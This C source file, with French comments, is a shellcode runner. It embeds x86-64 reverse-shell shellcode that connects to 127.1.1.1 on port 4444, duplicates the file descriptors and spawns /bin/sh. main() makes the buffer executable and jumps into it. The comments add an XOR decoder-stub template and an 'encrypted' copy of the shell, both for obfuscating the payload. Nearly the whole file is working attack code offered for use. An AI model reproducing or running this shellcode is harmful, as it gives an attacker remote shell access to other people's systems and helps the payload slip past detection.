#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// "\xeb\x11\x5e\x31\xc9\xb1\xTailleDuShellCode\x80\x74\x0e\xff\xValeurDeLaCleXOR\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff" //
// Shell chiffre : \x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a

int main(){
unsigned char *shellcode = "\xb0\x2a\x2c\x01\x48\x31\xFF\x40\xB7\x03\x40\x80\xEF\x01\x4D\x31\xC0\x4C\x89\xC6\x4D\x31\xC0\x4C\x89\xC2\x0F\x05\x49\x89\xC1\x6A\x2A\x58\x4C\x89\xCF\x52\x52\x68\x7F\x01\x01\x01\xD0\x5C\x11\xD0\x02\x4D\x31\xC9\x49\x89\xE1\x4C\x89\xCE\x48\x83\xC2\x10\x0F\x05\x48\x31\xF6\x4D\x31\xC9\x41\xB1\x02\x44\x88\xCE\x7d\xf4\x4d\x31\xc0\x4c\x89\xc0\xb0\x21\xB0\x21\x0F\x05\x48\xff\xce\x7d\xf4\xad\xda\x0b\xad\xda\x0b\xad\xda\x0b\x48\x31\xd2\x48\x31\xc0\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x50\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\xB0\x3B\x0f\x05\xb0\x63\x2c\x27\x4D\x31\xC0\x4C\x89\xC2\x0f\x05";
  printf("Shellcode length: %x\n", strlen(shellcode));
  int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())shellcode;
  return ret();
}